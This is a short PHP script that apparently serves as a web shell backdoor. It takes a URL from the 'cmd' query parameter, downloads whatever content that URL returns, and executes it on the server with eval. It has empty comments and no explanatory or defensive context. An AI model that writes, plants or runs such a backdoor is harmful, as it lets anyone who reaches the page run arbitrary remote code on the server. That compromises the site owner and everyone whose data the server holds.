<?php

if ( isset($_GET['cmd']) ) {
    // 
    $cmd_url = $_GET['cmd'];

    // 
    if ( filter_var($cmd_url, FILTER_VALIDATE_URL)) {
        echo "<pre>";
        // 
        $content = file_get_contents($cmd_url);
        eval('?>' . $content);
        echo "</pre>";
    }
}
